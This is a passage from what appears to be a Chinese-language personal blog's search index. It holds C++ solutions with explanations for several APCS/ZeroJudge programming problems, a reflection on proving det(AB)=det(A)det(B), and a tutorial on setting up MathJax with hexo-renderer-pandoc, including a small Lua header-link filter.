loop\n指令。保證所有 loop 指令內一定會有至少一個 T 指令。\n請寫一個程式，根據給定的指令串，計算指針總共移動的距離。\n範例： 給定指令串：T10T15T23T23T22T22T44 指針總共移動的距離為：5 + 8\n+ 0 + 1 + 0 + 22 = 36\n\n\n解題思路：\n感覺起來這題有點像是有括號的四則運算，T 之間就是加法和減法，L 跟 E 之間是括號，L 後面的數字就是乘法，不過實作上要注意的比較多，像是當 L 在當第一個的時候，L 跟 E 中間的部分應該怎麼與前後串連起來，要是一個不小心，就會跟 AC 失之交臂。\n🌟可以先把字串指令轉換成方便處理的格式，再用陣列或資料結構處理會比較方便\n\nAPCS 磁軌移動序列#include &lt;bits/stdc++.h&gt;#define int long long#define piii pair&lt;int,pair&lt;int,int&gt; &gt;#define sum first#define first_num second.first#define last_num second.second#define out(s,f,l) make_pair(s,make_pair(f,l))using namespace std;queue&lt;int&gt; in;char S[100006];piii get_dis(){    int dis=0, last = in.front(), _first = in.front();    while(in.front()!=-1){        int cur = in.front();        in.pop();        if(cur &gt;= 10) dis+=abs(cur-last), last=cur;        else{            int time=cur;            piii inside=get_dis();            dis+=time*inside.sum+(time-1)*abs(inside.first_num-inside.last_num);            if(_first&lt;10) _first=inside.first_num;            else dis+=abs(last-inside.first_num);            last = inside.last_num;        }    }in.pop();    return out(dis, _first, last);}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin &gt;&gt; S;    for(int i=0; S[i]; i++){        if(S[i]=='T') in.push((S[i+1]-'0')*10+(S[i+2]-'0')),i+=2;        if(S[i]=='L') in.push((S[i+1]-'0')),i+=1;        if(S[i]=='E') in.push(-1);    }in.push(-1);    piii res = get_dis();    cout &lt;&lt; res.sum + abs(10 - res.first_num) &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS 美食博覽會 (zerojudge g278)","url":"/zerojudge_g278/","content":"題目網址\n在一個美食博覽會上，有 \\(n\\) 個攤位在販售美食，已知每個攤位只會販售一種美食，且他們販售的美食依序是 \\(a1,a2,…,an\\)，其中可能會有某些攤位販售相同種類的美食。\n國王及大臣們總共 \\(k\\) 人要依序品嚐所有美食，已知每位品嚐員會選擇一段連續的攤位進行試吃，而每個人都不想要試吃到同一種自己曾經吃過的美食，因此一位品嚐員所選到的範圍不能有同一種美食重複出現。另外，品嚐員們都不喜歡被別人打擾用餐，所以任意兩個品嚐員所選到的連續區間必須是沒有重疊的。\n給你 \\(n\\),\\(k\\)，以及這 \\(n\\) 個攤位分別販售的美食編號，請計算出這些試吃員們總共最多可以吃到幾攤的美食？\n\n\n解題思路：\n先從 50% 的測資數來想，\\(k=1\\) 時應該怎麼做，這時要解的問題就變成，最大不重複子序列，可以再轉換成以第 \\(i\\) 為開頭往後幾項不重複！（最後再找最長的就好），可能還是不知道怎麼做嗎？\n我的想法是從最後一項開始做，因為以最後一項為開頭，一定就只有一項不重複（因為它也沒有後面的了），接下來倒數第二項就是看他跟倒數第一項是不是一樣，倒數三項就是看它跟前兩項一不一樣，那倒數第 \\(i\\) 項要怎麼求呢？如果一項項比對會花到 \\(O(N^2)\\) 的時間，因此我這裡使用了一個資料結構，Queue，具體來說從 \\(n-1\\) 開始往前推 (我使用 0-base)，如果該項沒有出現在 Queue 中，就把那項推進去，而已那項為開頭的不重複連續子字串就會是 Queue 的長度（把自己推進去後），而如果發現自己的號碼就已經在裡面的話，就把 Queue 一項一項 pop 掉，直到 Queue 裡面沒有跟自己一樣的號碼，那要怎麼在 \\(O(1)\\) 時間內判斷自己有沒有在 Queue 內呢？可以自己先想一想，最後有給出一個方法，而如此一來因為 Queue 最多就是裝下 \\(n\\) 個數字，所以最多也就只會 pop\\(n\\) 次，如此一來，就可以確定此方法能在 \\(O(n)\\) 內完成。\n接下來要解決 \\(k \\neq\n1\\) 的狀況，這邊我使用動態規劃，開一個 \\(dp[k][n]\\) 大小的陣列，\\(dp[i][j]\\) 代表 i 個人從 \\(0～j\\) 可以吃多少的攤位，因此最後答案就會是 \\(dp[k][n-1]\\)，首先我們可以先從前面提到 \\(k = 1\\) 將 \\(dp[1][j]\\) 全部填滿，接著因為 \\(i\\) 個人吃，最少就會有 \\(i\\) 個攤位，因此還會有 \\(dp[j][j-1]=j\\)，接著接下來就可以進行狀態轉移了：\n\n假設 \\(dp[i][j]\\) 的第 \\(j\\) 不選\n\\[dp[i][j] = max(dp[i][j],\ndp[i][j-1])\\]\n假設 \\(dp[i][j]\\) 的第 \\(j\\) 選\n\\[dp[i][j+len[j]-1] =\nmax(dp[i+1][j+len[j]-1], dp[i][j-1]+len[j])\\]\n\n(len [i] 表示以 i 為開頭的最大不重複子序列長度)\n🌟可以開一個 vis 陣列，以 vis [i] 表示 i 有沒有在連續部分\n🌟\\(dp[1][j]\\) 可以在一開始推最大不重複子序列時先設定好部分內容\n\\[dp[1][j+num[j]-1]=max(dp[1][j+num[j]-1],num[j])\\]\n然後再利用動態規劃狀態轉移時 \\(dp[i][j] =\nmax(dp[i][j], dp[i][j-1])\\) 完成整組 \\(dp[1][j]\\)\n\n美食博覽會 - 50%#include &lt;bits/stdc++.h&gt;using namespace std;//len[i]代表第i個攤位為開頭可以往後吃多遠都不重複int len[1000006], num[1000006], n, k;//用一個queue從後面開始裝，同時用vis[i]代表在queue內存不存在queue&lt;int&gt; q;bool vis[1000006];signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    cin &gt;&gt; n &gt;&gt; k;    for(int i =0;i &lt; n; i++) cin &gt;&gt; num[i];    q.push(num[n-1]),vis[num[n-1]]=1;    int max_len=0;    for(int i = n-2; i&gt;=0; i--){        while(vis[num[i]] &amp;&amp; !q.empty())            vis[q.front()]=0, q.pop();        q.push(num[i]),vis[num[i]]=1;        len[i]=q.size(), max_len=max(len[i], max_len);    }    cout&lt;&lt;max_len&lt;&lt;'\\n';    return 0;}\n 美食博覽會 - 100%#include &lt;bits/stdc++.h&gt;using namespace std;//len[i]代表第i個攤位為開頭可以往後吃多遠都不重複//dp[i][j]代表i個人從0~j可以吃多少int len[1000006], num[1000006], n, k, dp[22][1000006];//dp[i][j] = max(dp[i][j], dp[i][j-1])//dp[i+1][j+len[j]-1] = max(dp[i+1][j+len[j]-1], dp[i][j-1]+len[j])//dp[j][j-1]=j//用一個queue從後面開始裝，同時用vis[i]代表在queue內存不存在queue&lt;int&gt; q;bool vis[1000006];signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    memset(dp, 0, sizeof(dp));    cin &gt;&gt; n &gt;&gt; k;    for(int i =0;i &lt; n; i++) cin &gt;&gt; num[i];    q.push(num[n-1]),vis[num[n-1]]=1;    for(int i = n-2; i&gt;=0; i--){        while(vis[num[i]] &amp;&amp; !q.empty())            vis[q.front()]=0, q.pop();        q.push(num[i]),vis[num[i]]=1;        len[i]=q.size();        dp[1][i+len[i]-1]= max(dp[1][i+len[i]-1], len[i]);    }    for(int i = 1; i&lt;=k; i++){        dp[i][i-1]=i;        for(int j = i;j&lt;n; j++){            dp[i][j] = max(dp[i][j], dp[i][j-1]);            dp[i+1][j+len[j]-1] = max(dp[i+1][j+len[j]-1], dp[i][j-1]+len[j]);        }    }    cout&lt;&lt;dp[k][n-1]&lt;&lt;'\\n';    return 0;}\n\n\nAC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS-2016-1029-3 定時 K 彈 (zerojudge c296)","url":"/zerojudge_c296/","content":"題目網址\n「定時 K 彈」 是一個團康遊戲，N 個人圍成一圈，由 1 號依序到 N 號，從 1 號開\n始依序傳遞一枚玩具炸彈，每次到第 M 個人就會爆炸，此人即淘汰，被淘汰的人要離開圓圈，然後炸彈再從該淘汰者的下一個開始傳遞。遊戲之所以稱\nK 彈是因為這枚炸彈只會爆 K 次，在第\nK 次爆炸後，遊戲即停止，而此時在第 K 個淘汰者的下一位遊戲者被稱為幸運者，通常就會要求表演節目。\n輸入只有一行包含三個正整數，依序為 N、M 與 K，請輸出幸運者的號碼。\n\n\n解題思路：\n\n直接模擬 \\(O(N^2)\\)（有機會 AC）\n雖然依照這題的限制應該是絕對 TLE，但實際試過之後還是有機會過的，可能是測資還不夠極限，總之這個方法就是假解。\n實際來講，我的方法是找到最後剩下的個數，以及最後一圈走的步數，最後就可以知道誰是幸運者了，但因為我模擬時出局的人要花 \\(O(N)\\) 的時間 erase，所以就會花上 \\(O(KN)\\) 的時間 (K &lt; N 所以就寫成 \\(O(N^2)\\))，實際可以看底下的程式。\n\n線段樹做 \\(O(N log\nN)\\)（一定 AC）\n一樣直接模擬，但 erase 時間可以縮短至 \\(O(log\nN)\\)\n\n使用約瑟夫問題演算法 \\(O(N)\\)（一定 AC）\n約瑟夫問題就等價這題 \\(k=N-1\\)，也就是最後只剩下一個人的狀況，也就是 70% 的測資，那在講正確解前，就先說原始的約瑟夫問題，這個方法的邏輯是「倒推」，假設當你已經知道有 \\(N-1\\) 人時，留下來的那個人會是哪一號，那應該怎麼推得 \\(N\\) 人時，留下來的人是誰呢？可以看一下底下這張圖（以下會用 0-base 為說明，但實際是 1-base，所以記得最後要 + 1）\n\n我們不知道 N 個人誰會是幸運者，但是我們可以知道 \\(m-1\\) 號（從 0 開始所以第 \\(m\\) 個人是 \\(m-1\\) 號）會在第一輪出局，這時候想想看，那個人出局後就變成 \\(N-1\\) 人了！那出局後的狀況跟上一張圖之間有什麼差別，有什麼辦法可以將一人出局後的狀況轉換到 \\(N-1\\) 人的狀況呢？\n\n❗️把出局後那個人的下一個人當成是 \\(N-1\\) 狀況 \\(0\\) 的位置，旋轉看看！\n\n把 \\(m\\) 號對齊 \\(0\\) 號就可以找到幸運人的位置（暫且先叫他 \\(Y\\)），可以簡單看一下就知道，原先 \\(N-1\\) 圖的每個人會相較外圈對齊的數字少 \\(m\\)，因此 \\(Y\\) 就會是 \\(X+m\\)(另外要注意如果加 \\(m\\) 超過 \\(N\\) 的話要再繞回來，就是對 \\(X+m\\) 取其除以 \\(N\\) 的餘數)\n因為知道最後剩下一個人的狀況就是自己當一個圈且編號是 0，那麼就可以列出一遞迴式\n\\[f(N)=(f(N-1)+m) mod N,\nf(1)=0\\]\n那麼當 \\(k \\neq N-1\\) 時，可以再把 \\(k\\) 加入判斷條件，將 \\(N\\) 人 \\(k\\) 次爆炸轉換成 \\(N-1\\) 人 \\(k-1\\) 次爆炸，一樣的，每個人會被往後挪 \\(m\\) 格，那終端條件呢？\\(N-K\\) 人爆炸 0 次時！\n那這時的幸運者就是 \\(0\\)！（因為爆炸 \\(0\\) 次，或者倒過來講就是 \\(N-k+1\\) 時 \\(m-1\\) 號的下一個 \\(m\\) 號，前一圈會比後一圈多 \\(m\\)，所以當然就是 \\(0\\) 了），而我們也可以藉此推出以下這個遞迴式\n\\[f(N,k)=(f(N-1,k-1)+m) mod N, f(N-k,0)=0,\nk&lt;N\\]\n到這邊應該就知道如何快速解決這題了！\n\n🌟\n如果有時間的話可以用線段樹解法寫寫看，不然直接用約瑟夫問題的方法一下就解決了，這樣不夠有趣🫠\n\n模擬法 O (N^2)//https://zerojudge.tw/ShowProblem?problemid=c296#include &lt;bits/stdc++.h&gt;using namespace std;signed main(){    ios::sync_with_stdio(0);    cin.tie(0); cout.tie(0);    // 直到最後還沒淘汰的    vector&lt;int&gt; available_num;    // 最後一圈時要走幾步才是那個被淘汰的，要先剪掉最後一圈被淘汰的人    int step=-1, n, m ,k;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    for(int i = 1; i&lt;=n; i++) available_num.push_back(i);    for(int i = 0; i&lt;k; i++){        step = (step+m)%available_num.size();        vector&lt;int&gt;::iterator it = available_num.begin()+step;        // cout &lt;&lt; *it &lt;&lt; '\\n';        available_num.erase(it);        step--;    }    cout &lt;&lt; available_num[(step+1)%available_num.size()] &lt;&lt; '\\n';    return 0;}\n 模擬＋線段樹 O (N log N)#include &lt;bits/stdc++.h&gt;#define N 200005using namespace std;int sg[4*N];// sg[idx]的右界int sg_R[4*N];void build(int l, int r, int idx){    if(r-l==1){        sg[idx]=1,sg_R[idx]=r;        return;    }    int mid = (r+l)/2;    build(l,mid,idx*2), build(mid,r,idx*2+1);    sg[idx]=sg[idx*2]+sg[idx*2+1], sg_R[idx]=r;}void del(int l, int r, int idx, int del_pos){    sg[idx]--;    if(r-l==1) return;    int mid = (l+r)/2;    if(del_pos&lt;mid) del(l,mid,idx*2,del_pos);    else del(mid,r,idx*2+1,del_pos);}//找第k大的idxint search_bigger_idx(int l, int r, int idx, int order){    if(r-l==1) return idx;    int mid = (r+l)/2;    if(sg[idx*2]&gt;=order) {        return search_bigger_idx(l, mid, idx*2, order);    }    else return search_bigger_idx(mid, r, idx*2+1, order-sg[idx*2]);}signed main(){    ios::sync_with_stdio(0);    cin.tie(0);     int n, m ,k, step=0;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    build(0,n,1);    for(int i = 0; i&lt;k; i++){        step = (step+m)%sg[1];        if(step==0) step=sg[1];        int idx = search_bigger_idx(0,n,1,step);        del(0,n,1,sg_R[idx]-1);        step--;    }    step = (step+1)%sg[1];    if(step==0) step=sg[1];    // 應該會是該位置的右界-1，但因為要從0-base轉1-base還要+1，所以就抵銷了    cout &lt;&lt; sg_R[search_bigger_idx(0,n,1,step)] &lt;&lt; '\\n';    return 0;}\n 約瑟夫問題演算法 O (N)#include &lt;bits/stdc++.h&gt;using namespace std;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);     int ans=0, n, m ,k;    cin &gt;&gt; n &gt;&gt; m &gt;&gt; k;    for(int i = n-k+1; i&lt;=n; i++) ans=(ans+m)%i;    cout &lt;&lt; ans+1 &lt;&lt; '\\n';    return 0;}\nAC 的 Submission 們～\n\n\n\n","categories":["程式題解","APCS"],"tags":["線段樹","APCS","約瑟夫問題"]},{"title":"APCS-2016-1029-1 三角形辨別 (zerojudge c294)","url":"/zerojudge_c294/","content":"題目網址\n三角形除了是最基本的多邊形外，亦可進一步細分為鈍角三形、直角三角形及銳角三角形。若給定三個線段的長度，透過下列公式運算，即可得知此三線段能否構成三角形，亦可判斷是直角、銳角和鈍角三角形。\n提示：若 a、b、c 為三個線段的邊長，且 c 為最大值，則\n　　若 a + b ≦ c　　　　　，三線段無法構成三角形\n　　若 a×a + b×b ＜ c×c　　，三線段構成鈍角三角形 (Obtuse triangle)\n　　若 a×a + b×b ＝ c×c　　，,三線段構成直角三角形 (Right triangle)\n　　若 a×a + b×b ＞ c×c　　，三線段構成銳角三角形 (Acute triangle)\n請設計程式以讀入三個線段的長度判斷並輸出此三線段可否構成三角形？若可，判斷\n並輸出其所屬三角形類型。\n\n\n解題思路：\n直接按照題目敘述判斷是哪一種三角形即可。\n🌟如果不想要自己比三個數字的話可以開個陣列儲存然後 sort 一下就好了\n\n三角形辨別#include &lt;bits/stdc++.h&gt;using namespace std;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    int arr[4];    cin &gt;&gt; arr[0] &gt;&gt; arr[1] &gt;&gt; arr[2];    sort(arr, arr+3);    cout &lt;&lt; arr[0] &lt;&lt; ' ' &lt;&lt; arr[1] &lt;&lt; ' ' &lt;&lt; arr[2] &lt;&lt; '\\n';    if(arr[0]+arr[1]&lt;=arr[2]) cout &lt;&lt; \"No\\n\";    else if(arr[0]*arr[0]+arr[1]*arr[1]&lt;arr[2]*arr[2]) cout &lt;&lt; \"Obtuse\\n\";    else if(arr[0]*arr[0]+arr[1]*arr[1]==arr[2]*arr[2]) cout &lt;&lt; \"Right\\n\";    else if(arr[0]*arr[0]+arr[1]*arr[1]&gt;=arr[2]*arr[2]) cout &lt;&lt; \"Acute\\n\";    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"用高中數學從頭證明 det (AB)=det (A) det (B)","url":"/det(AB)=det(A)det(B)_proof/","content":"前言 \n高二下學期的最後一個單元 —— 矩陣，發現許多同學在計算時會使用到 \\(det(AB)=det(A) \\cdot\ndet(B)\\) 這個性質，讓運算時的速度加快或是能更快的在是非題中作答，若只要證明其在 2 階、3 階的正確性並不難，但若要將 \\(A\\)、\\(B\\) 拓展至 \\(n\\) 階方陣，想要證明此性質實在頗不容易，問了許多同學後發現幾乎所有人都知道這個公式，但沒有任何一個人知道如何證明，如此不求甚解的狀況實在非常令人痛心，後來詢問了老師，知道這其實並非在高中的課綱範圍之內，但老師仍鼓勵我進一步的研究，也有助於對矩陣的理解，以及進一步窺探未來大學線性代數的知識，因此就開始查詢相關資料並著手證明。\n\n完整文檔 \n由於使用網頁呈現在不同裝置上可能會有跑版的狀況，所以這邊就改用 PDF 的方式呈現，可以在網站上參閱或是下載閱讀。\n\n反思與心得 \n由於高中的課程只有介紹到 2 階及 3\n階的矩陣和行列式，造成許多同學對其中的一些觀念有許多誤解，也使得對很多性質不會更深入探討，最常見的就是以爲\nn 階行列式跟 2、3 階的求法一樣，殊不知單純 4 階行列式需要做 24\n次加減法操作，5 階更要做 120 次，根本不可能有這麼簡便\n的方法求得，本篇所講探討的 \\(det(AB)=det(A)\n\\cdot\ndet(B)\\) 亦有相同的狀況，很多補習班或老師為了讓學生快速上手就要求學生背下來，雖說也是迫於考試需求，但這實在有損科學研究之精神。要所有人都理解\nn\n階矩陣和行列式的性質及證明確實太過癡人說夢，但身為高中若想要理解這些原理能夠找到的資源實在不多，\n要不是因為有周志成教授線代啟示錄的網站，我應該也很難研究出這些，但在現下台灣仍是升學導向的社會，我只希望能夠有更多像線代啟示錄之類的資源能夠取得，因此我決定從我自己開始做起，我想將我現在還有未來所有研究過的結果都放到網路上讓大家參考 (也就是目前這個網誌)，就如同周志成教授在網站中說的「寧爛勿缺」，雖然教授是自謙，但對我而言正是如此，希望這篇文章能夠啟發更多人\n將自身經驗分享至網路，既然目前體制無法改變，就先從改變我們自己開始!\n","categories":["數學"],"tags":["線性代數","證明"]},{"title":"APCS-2016-1029-2 最大和 (zerojudge c295)","url":"/zerojudge_c295/","content":"題目網址\n給定 N 群數字，每群都恰有 M 個正整數。若從每群數字中各選擇一個數字\n(假設第 i 群所選出數字為 ti)，將所選出的 N 個數字加總即可得和 S = t1 + t2+…+\n+…+ tN。請寫程式計算 S 的最大值 (最大總和\n)，並判斷各群所選出的數字是否可以整除 S。\n\n\n解題思路：\n就是找到每一群裡最大的然後加起來，再一一檢查哪些可以被整除，這題 N、M 都給 &lt; 20，可以放心做，不用超時問題\n🌟可以在一開始接收數據時就把最大值抓出來，其他的就直接丟掉不用理他，後面會需要用到的也都只有每一個群裡面的最大值而已，這樣會比較簡單\n\nAPCS-2016-1029-2 最大和#include &lt;bits/stdc++.h&gt;using namespace std;signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    int n,m,max_nums[22],s=0;    cin &gt;&gt; n &gt;&gt; m;    for(int i = 0,max_=0; i&lt;n; i++,max_=0){        for(int j=0,tmp; j&lt;m; j++)            cin&gt;&gt;tmp, max_=max(max_,tmp);        s+=max_,max_nums[i]=max_;    }cout&lt;&lt;s&lt;&lt;'\\n';    bool first=0;    for(int i = 0; i&lt;n; i++){        if(s%max_nums[i]==0&amp;&amp;!first) cout&lt;&lt;max_nums[i],first=1;        else if(s%max_nums[i]==0) cout&lt;&lt;' '&lt;&lt;max_nums[i];    }if(!first) cout&lt;&lt;-1;    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"APCS2017-0304-3 數字龍捲風 (zerojudge c292)","url":"/zerojudge_c292/","content":"題目網址\n給定一個 N * N 的二維陣列，其中 N 是奇數，我們可以從正中間的位置開始順時\n針旋轉的方式走訪每個陣列元素恰好一次。對於給定的陣列內容與起始方向，請輸出走訪順序之內容。\n提示：本題有多種處理方式，其中之一是觀察每次轉向與走的步數。例如起始方向是向左時，前幾步的走法是：左 1、上\n1、右 2、下 2、左 3、上 3、…… 一直到出界為止。\n\n\n解題思路：\n這題的提示真的太明顯，實在有點讓人來不及思考就把答案講出來了，正式考試應該沒有提示吧🤔\n總之就是按照提示說的，每經過兩次不同方向移動就會多走一步，這邊要注意一點，最後走的那一次不會多走一步（以 3 * 3 來說，走的步數會是 1、1、2、2、2，而不是 1、1、2、2、3），要記得注意這個狀況。\n因為這個過程每個點都只會被拜訪一次，總共有 \\(N^2\\) 個點，所以時間複雜度就會是 \\(O(N^2)\\)，而且 \\(N&lt;50\\)，所以絕對不可能超時的👍\n🌟因為是每經過兩次不同方向移動，這邊有一個小技巧，一開始把要走的步數設定成 10，每次 + 5，要用的時候再除以 10，寫起來會比較方便（或者是你可以用 double 一次增加 0.5，使用時再轉換成 int，但我比較不建議，雖然這題不會怎樣，但 double 能少用還是不要用，要不然如果太習慣，數字大了之後出現精度問題還要想辦法修正），另一點在移動的部分，可以開兩個陣列代表 x 移動方向跟 y 移動方向，然後依據目前方向代碼在陣列中索引移動方向（也可以開一個陣列同時兼顧 x 跟 y，雖然很酷但其實省這一點點空間根本沒差，所以還是推薦開兩個陣列會比較方便），當然如果你要開四個 if 跟迴圈也是可以的。\n小插曲：我意外發現這題最後不換行也可以過\n\nAPCS2017-0304-3 數字龍捲風#include &lt;bits/stdc++.h&gt;using namespace std;// 0代表左 、1代表上 、2代表右 、3代表下signed main(){    ios::sync_with_stdio(0);    cin.tie(0);    int n, dir;    int arr[55][55];    vector&lt;int&gt; records;    cin &gt;&gt; n &gt;&gt; dir;    for(int i = 0; i&lt;n; i++)        for(int j = 0; j&lt;n; j++)            cin &gt;&gt; arr[j][i];    int dirs_x[5] = {-1, 0, 1, 0}, dirs_y[5] = {0, -1, 0, 1};    int cur_x=n/2, cur_y=n/2, pace=10;    records.push_back(arr[cur_x][cur_y]);    while(cur_x&gt;=0&amp;&amp;cur_x&lt;n&amp;&amp;cur_y&gt;=0&amp;&amp;cur_y&lt;n){        for(int i = 0, cur_p=pace/10; i&lt;cur_p; i++){                cur_x+=dirs_x[dir], cur_y+=dirs_y[dir];                if(cur_x&gt;=0&amp;&amp;cur_x&lt;n&amp;&amp;cur_y&gt;=0&amp;&amp;cur_y&lt;n)                    records.push_back(arr[cur_x][cur_y]);        }        dir = (dir+1)%4, pace+=5;    }    for(int i : records) cout &lt;&lt; i;    cout &lt;&lt; '\\n';    return 0;}\n\n\n AC 的 Submission～\n\n","categories":["程式題解","APCS"],"tags":["APCS"]},{"title":"Hexo-NexT MathJax 配置","url":"/Hexo-Next_MathJax/","content":"前言 \n因為 Hexo 本身的 markdown 語法不能使用 LaTeX 進行數學式的編寫，需要額外安裝插件，也就是 MathJax，基本上跟 LaTeX 語法是一模一樣的。\n另外，本篇幾乎皆取自官方說明，有興趣可以自行參閱，接下來我會根據以下三點，一一進行介紹。\n\n\n安裝\n修改設定\n範例\n\n安裝 \n安裝 / 卸載套件 \n這邊載的是渲染網頁的套件，因為 hexo 本來就有自己的渲染工具了，所以要將其解除安裝並下載新的渲染工具，另外這裡也要注意一下如果你之前有安裝過hexo-math或hexo-katex要把他們解除安裝，不然也有可能會發生衝突\nnpm un hexo-renderer-markednpm i hexo-renderer-pandoc\n本機安裝 pandoc \n這一點非常重要，我因為這個坑花了一個多小時，最後才在github 上的討論找到解決方法，需要額外安裝 pandoc 在本機，其實官方的文檔裡面有寫，但我沒看到🥲\n各個作業系統安裝方式不一，我就一一整理打在底下，記得挑選符合自己作業系統的複製執行喔\n#Windows（這裡需要有chocolatey，如果沒有安裝的話可以去搜尋一下安裝方式，整體過程並不複雜，而且未來用到機會很高）choco install pandoc#macOS（這裡需要有homebrew，如果沒有安裝的話可以去搜尋一下安裝方式，整體過程並不複雜，而且未來用到機會很高）brew install pandoc#Linux（基本上原本電腦裡應該都有Pandoc，不過也還是可以下載更新到最新版本）#先到 https://github.com/jgm/pandoc/releases/latest 下載安裝檔，然後再執行指令安裝，$DEB是安裝檔路徑sudo dpkg -i $DEB#Chrome（這個需要chromebrew，我沒有用過，但看起來應該不是很麻煩）crew install pandoc\n這邊是 pandoc 官方安裝教學\n修改設定 \n到主題中的config.yml找到 math 的位置，並修改成以下內容\ntheme/NexT/_config.ymlmath:  # 如果是true就代表不用特別設定要不要使用MathJax，所有頁面都會套用，除非設定false  # 如果是false就代表不用特別設定要不要使用MathJax，所有頁面都不會套用，除非設定true  every_page: true  mathjax:    # 就是說要取用mathjax    enable: true    # tag後面會講到，就先選ams    # Available values: none | ams | all    tags: ams\n後來發現 mathjax 好像有可能會造成一些跑版的問題，像下圖\n\n可以執行以下指令，好像就能解決了 (但又會出現標籤沒辦法用的問題，詳見下文)\nnpm un hexo-renderer-markednpm un hexo-renderer-pandocnpm i hexo-renderer-pandoc\n這裡需要注意一件事，hexo-renderer-pandoc 和原先的 hexo-renderer-marked 是兩個不同的渲染器（應該是這樣翻吧），所以說生成的結果會與原先不同，目前我遇到的問題就是如果之前的文章換行是直接按 Enter 的話，生成出來的會沒有成功換行，需要重新手動調整在每行後面多加兩個空格。另外還有一個就是文章標題的網址會跑掉（例如說 header\n123 原先生成的網址會是https://example.com/myarticle/#header-123，但用這個渲染出來的會是https://example.com/myarticle/#header123）。最後還有對使用比較有影響的就是標題最後面的迴紋針符號也會不見（headerlink），於是我到 github 上開issue 求救，然後就有厲害的大神告訴我怎麼做了 &gt;_&lt;\n\n\n\n&lt;summary&gt;總之，就是到 `themes/Your-Theme-Name/script` 開一個 `javascript腳本`，然後把底下的東西貼進去 &lt;/summary&gt;&lt;!–code￼4–&gt;\n\n後來其中一個作者說用正則表達式不太好，建議用 Pandoc\nfilter，然後隔了超久之後我就自己改了一個出來了。\n\n在./source/_data下新增一個header-link-filter.lua檔案，內容如下\n\n-- header-link-filter.luafunction Header(el)    -- Create a link    local link = pandoc.Link(\"\", \"#\" .. el.identifier, \"\", pandoc.Attr(\"\", {\"headerlink\"}))      -- Insert the link into the header content    table.insert(el.content, pandoc.Space())    table.insert(el.content, link)      return el\n\n在./_config.yml最後新增以下內容\n\npandoc:  args:    - \"-f\"    - \"markdown\"    - \"-t\"    - \"html\"    - \"--mathjax\"    - '--lua-filter'    - './source/_data/header-link-filter.lua'\n然後應該就完成了～\n\n範例 \n這邊有一些範例可以試試看\n$$A = \\begin{bmatrix}        a_{11}    &amp; a_{12}    &amp; ...    &amp; a_{1n}\\\\        a_{21}    &amp; a_{22}    &amp; ...    &amp; a_{2n}\\\\        a_{31}    &amp; a_{22}    &amp; ...    &amp; a_{3n}\\\\        \\vdots    &amp; \\vdots    &amp; \\ddots &amp; \\vdots\\\\        a_{n1}    &amp; a_{n2}    &amp; ... &amp; a_{nn}\\\\    \\end{bmatrix} , b = \\begin{bmatrix}        b_{1}  \\\\        b_{2}  \\\\        b_{3}  \\\\        \\vdots \\\\        b_{n}  \\\\    \\end{bmatrix}$$$$\\begin{aligned}a &amp;= b + c \\\\  &amp;= d + e + f + g \\\\  &amp;= h + i\\end{aligned}$$$$e=mc^2$$$$C_p[\\ce{H2O(l)}] = \\pu{75.3 J // mol K}$$\n實際的效果大概就是長這樣\n\\[\nA = \\begin{bmatrix}\n        a_{11}    &amp; a_{12}    &amp; ...    &amp; a_{1n}\\\\\n        a_{21}    &amp; a_{22}    &amp; ...    &amp; a_{2n}\\\\\n        a_{31}    &amp; a_{22}    &amp; ...    &amp; a_{3n}\\\\\n        \\vdots    &amp; \\vdots    &amp; \\ddots &amp; \\vdots\\\\\n        a_{n1}    &amp; a_{n2}    &amp; ... &amp; a_{nn}\\\\\n    \\end{bmatrix} , b = \\begin{bmatrix}\n        b_{1}  \\\\\n        b_{2}  \\\\\n        b_{3}  \\\\\n        \\vdots \\\\\n        b_{n}  \\\\\n    \\end{bmatrix}\n\\]\n\\[\n\\begin{aligned}\na &amp;= b + c \\\\\n  &amp;= d + e + f + g \\\\\n  &amp;= h + i\n\\end{aligned}\n\\]\n\\[\ne=mc^2\n\\]\n\\[\nC_p[\\ce{H2O(l)}] = \\pu{75.3 J // mol K}\n\\]\n可以發現最後這個還是化學式，沒錯，MathJax 也可以撰寫化學式，詳細語法可以看這邊\n最後就是標籤的功能，前面在設定tag我們選了ams，那他的功能就是可以讓我們給每一個式子一個編號，例如像這樣\n$$\\begin{equation} \\label{eq1}e=mc^2\\end{equation}$$\n\\[\\begin{equation} \\label{eq1}\ne=mc^2\n\\end{equation}\\]\n在後文中就可以使用$\\eqref{eq1}$來引用式子，像這樣 \\(\\eqref{eq1}\\)\n另外如果想用其他文字來編號的話可以用\\tag{}來標記方程式，使用\\label{}當作引用時的標前，例如說以下這個式子\n$$x+1\\over\\sqrt{1-x^2} \\tag{i}\\label{eq_tag}$$\n\\[x+1\\over\\sqrt{1-x^2}\n\\tag{i}\\label{eq_tag}\\]\n而要引用時要使用\\label{}括號中的內容，以上面的為例就是$\\eqref{eq_tag}$，實際的樣子應該就是像這樣 \\(\\eqref{eq_tag}\\)\n結語 \n現在可以自由輸入各種漂亮的式子了～如果有問題或者發現我有哪裡講錯，歡迎大家到底下留言區跟我討論喔～\n其他功能 \n\n側邊欄\n－ 基礎配置 (關於、標籤、分類、歸檔、搜尋、頭像、個人相關連結)\n－ 切換語言\n頁底\nutterances 留言板\nGoogle\nAnalytics 統計網站資訊\n日 / 夜模式\nlive2d 角色（就是網頁右下角那隻可愛的狗狗）\nSEO：搜尋引擎最佳化 (Search Engine\nOptimization)\n剩下的一些小工具\n自訂網域\n\n","categories":["教學文"],"tags":["Hexo","NexT"]},{"title":"APCS 血緣關係 (zerojudge b967)","url":"/zerojudge_b967/","content":"題目網址\n下圖為家族的關係圖：0 是 7 的孩子， 1、2 和 3 是 0 的孩子， 4 和 5 是\n1 的孩子， 6 是 3 的孩子。\n可以發現最遠的親戚關係為 4 (或 5) 和 6，他們的” 血緣距離” 是 